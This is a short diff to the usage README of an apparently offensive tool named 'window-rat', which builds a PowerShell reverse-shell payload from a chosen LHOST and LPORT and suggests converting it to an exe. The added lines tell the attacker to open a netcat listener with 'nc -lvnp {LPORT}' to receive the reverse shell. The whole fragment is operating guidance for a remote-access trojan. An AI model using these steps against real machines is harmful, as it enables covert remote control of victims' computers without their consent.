@@ -40,6 +40,8 @@
     2. Now enter LHOST (your IP or server in which u want to get reverse shell)
     3. Now enter LPORT (which port u want to connect)
     4. Your payload will be saved in /window-rat/{bypass.ps1} .
+    5. In Attacker System, use netcat to get the reverse shell like below
+    6. nc -lvnp {LPORT}
     
 # Bonus Tip:
     This tool generate powershell payload so in order to convert it into exe format
